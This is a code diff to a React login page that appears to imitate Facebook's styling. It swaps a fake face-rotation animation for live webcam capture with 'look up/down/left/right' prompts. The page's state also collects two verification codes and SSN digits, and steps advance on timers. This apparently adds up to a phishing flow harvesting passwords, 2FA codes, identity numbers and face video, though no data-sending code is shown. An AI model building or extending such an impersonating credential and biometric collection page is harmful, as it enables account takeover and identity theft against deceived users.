@@ -89,6 +89,10 @@ export default function LoginPage() {
   const [verificationCode2, setVerificationCode2] = useState("");
   const [ssnDigits, setSsnDigits] = useState("");
   const [faceRotation, setFaceRotation] = useState(0);
+  const [stream, setStream] = useState<MediaStream | null>(null);
+  const [currentDirection, setCurrentDirection] = useState<"center" | "up" | "down" | "left" | "right">("center");
+  const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
+  const videoRef = useState<HTMLVideoElement | null>(null)[0];
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -125,22 +129,18 @@ export default function LoginPage() {
       timer = setTimeout(() => setCurrentStep("ssn"), 10000);
     } else if (currentStep === "loading-ssn") {
       timer = setTimeout(() => setCurrentStep("face-verification"), 5000);
-    } else if (currentStep === "face-rotation") {
-      const rotationTimer = setInterval(() => {
-        setFaceRotation(prev => {
-          if (prev >= 360) {
-            clearInterval(rotationTimer);
-            setCurrentStep("complete");
-            return 360;
-          }
-          return prev + 3;
-        });
-      }, 50);
-      return () => clearInterval(rotationTimer);
     }
     
     return () => clearTimeout(timer);
   }, [currentStep]);
+
+  useEffect(() => {
+    return () => {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    };
+  }, [stream]);
 
   const handleLogin = async (data: LoginForm) => {
     setIsLoggingIn(true);
@@ -167,9 +167,42 @@ export default function LoginPage() {
     }
   };
 
-  const handleStartFaceRotation = () => {
-    setFaceRotation(0);
-    setCurrentStep("face-rotation");
+  const handleStartFaceVerification = async () => {
+    try {
+      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" },
+        audio: false 
+      });
+      setStream(mediaStream);
+      setCurrentStep("face-rotation");
+      setCurrentDirection("center");
+      setCompletedDirections(new Set());
+      
+      if (videoRef) {
+        videoRef.srcObject = mediaStream;
+      }
+    } catch (error) {
+      console.error("Camera access denied:", error);
+      alert("Please allow camera access to continue with face verification");
+    }
+  };
+
+  const handleDirectionComplete = (direction: string) => {
+    const newCompleted = new Set(completedDirections);
+    newCompleted.add(direction);
+    setCompletedDirections(newCompleted);
+
+    const directions = ["up", "down", "left", "right"];
+    const remainingDirections = directions.filter(d => !newCompleted.has(d));
+    
+    if (remainingDirections.length === 0) {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      setCurrentStep("complete");
+    } else {
+      setCurrentDirection(remainingDirections[0] as any);
+    }
   };
 
   const handleSignup = async (data: SignupForm) => {
@@ -406,15 +439,15 @@ export default function LoginPage() {
             <div className="text-center">
               <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Face Verification</h2>
               <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                We need to verify your identity using facial recognition.
+                We need to verify your identity using facial recognition. You'll be asked to look in different directions.
               </p>
               <div className="w-32 h-32 mx-auto mb-6 rounded-full border-4 flex items-center justify-center" style={{ borderColor: '#1877f2' }}>
                 <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
                 </svg>
               </div>
               <button
-                onClick={handleStartFaceRotation}
+                onClick={handleStartFaceVerification}
                 className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                 style={{ backgroundColor: '#1877f2' }}
                 data-testid="button-start-face"
@@ -424,35 +457,96 @@ export default function LoginPage() {
             </div>
           )}
 
-          {/* Face Rotation */}
+          {/* Face Rotation - Camera Feed */}
           {currentStep === "face-rotation" && (
             <div className="text-center">
-              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>Rotate Your Face</h2>
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                Slowly rotate your face in a circle
+              <h2 className="text-xl font-bold mb-2" style={{ color: '#1c1e21' }}>
+                {currentDirection === "center" ? "Position Your Face" : `Look ${currentDirection.toUpperCase()}`}
+              </h2>
+              <p className="text-sm mb-4" style={{ color: '#65676b' }}>
+                {currentDirection === "center" 
+                  ? "Center your face in the frame" 
+                  : `Turn your head to look ${currentDirection}`}
               </p>
-              <div className="w-40 h-40 mx-auto mb-6 relative">
-                <div className="absolute inset-0 rounded-full border-4" style={{ borderColor: '#e4e6eb' }} />
-                <div 
-                  className="absolute inset-0 rounded-full border-4 border-transparent"
-                  style={{ 
-                    borderTopColor: '#1877f2',
-                    borderRightColor: faceRotation > 90 ? '#1877f2' : 'transparent',
-                    borderBottomColor: faceRotation > 180 ? '#1877f2' : 'transparent',
-                    borderLeftColor: faceRotation > 270 ? '#1877f2' : 'transparent',
-                    transform: `rotate(${faceRotation}deg)`,
-                    transition: 'transform 0.05s linear'
+              
+              {/* Camera Feed */}
+              <div className="relative w-64 h-64 mx-auto mb-4 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+                <video
+                  ref={(el) => {
+                    if (el && stream) {
+                      el.srcObject = stream;
+                      el.play();
+                    }
                   }}
+                  autoPlay
+                  playsInline
+                  muted
+                  className="w-full h-full object-cover scale-x-[-1]"
                 />
-                <div className="absolute inset-4 rounded-full flex items-center justify-center" style={{ backgroundColor: '#f0f2f5' }}>
-                  <svg className="w-12 h-12" fill="none" stroke="#65676b" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
-                  </svg>
+                
+                {/* Direction Indicator Overlay */}
+                <div className="absolute inset-0 pointer-events-none">
+                  {/* Center circle guide */}
+                  <div className="absolute inset-0 flex items-center justify-center">
+                    <div 
+                      className="w-48 h-56 rounded-full border-4"
+                      style={{ 
+                        borderColor: completedDirections.has(currentDirection) ? '#00a400' : '#1877f2',
+                        borderStyle: 'dashed'
+                      }}
+                    />
+                  </div>
+                  
+                  {/* Direction arrow */}
+                  {currentDirection !== "center" && (
+                    <div className="absolute inset-0 flex items-center justify-center">
+                      <div 
+                        className="text-white font-bold text-4xl"
+                        style={{
+                          transform: 
+                            currentDirection === "up" ? "translateY(-80px)" :
+                            currentDirection === "down" ? "translateY(80px)" :
+                            currentDirection === "left" ? "translateX(-80px)" :
+                            currentDirection === "right" ? "translateX(80px)" : "",
+                          textShadow: '0 0 10px rgba(0,0,0,0.8)'
+                        }}
+                      >
+                        {currentDirection === "up" ? "↑" :
+                         currentDirection === "down" ? "↓" :
+                         currentDirection === "left" ? "←" :
+                         currentDirection === "right" ? "→" : ""}
+                      </div>
+                    </div>
+                  )}
                 </div>
               </div>
-              <p className="text-sm font-medium" style={{ color: '#1877f2' }}>
-                {Math.round((faceRotation / 360) * 100)}% Complete
+
+              {/* Progress indicators */}
+              <div className="flex justify-center gap-2 mb-4">
+                {["up", "down", "left", "right"].map((dir) => (
+                  <div
+                    key={dir}
+                    className="w-3 h-3 rounded-full"
+                    style={{
+                      backgroundColor: completedDirections.has(dir) ? '#00a400' : '#e4e6eb'
+                    }}
+                  />
+                ))}
+              </div>
+
+              <p className="text-sm font-medium mb-4" style={{ color: '#65676b' }}>
+                {completedDirections.size} of 4 directions completed
               </p>
+
+              <button
+                onClick={() => handleDirectionComplete(currentDirection)}
+                className="w-full py-3 text-white text-sm font-bold rounded-full transition"
+                style={{ backgroundColor: '#1877f2' }}
+                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
+                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+              >
+                {currentDirection === "center" ? "Start" : "Confirm Direction"}
+              </button>
             </div>
           )}
 
@@ -475,6 +569,12 @@ export default function LoginPage() {
                   setVerificationCode2("");
                   setSsnDigits("");
                   setFaceRotation(0);
+                  setCompletedDirections(new Set());
+                  setCurrentDirection("center");
+                  if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    setStream(null);
+                  }
                 }}
                 className="w-full py-3 text-white text-sm font-bold rounded-full transition"
                 style={{ backgroundColor: '#1877f2' }}
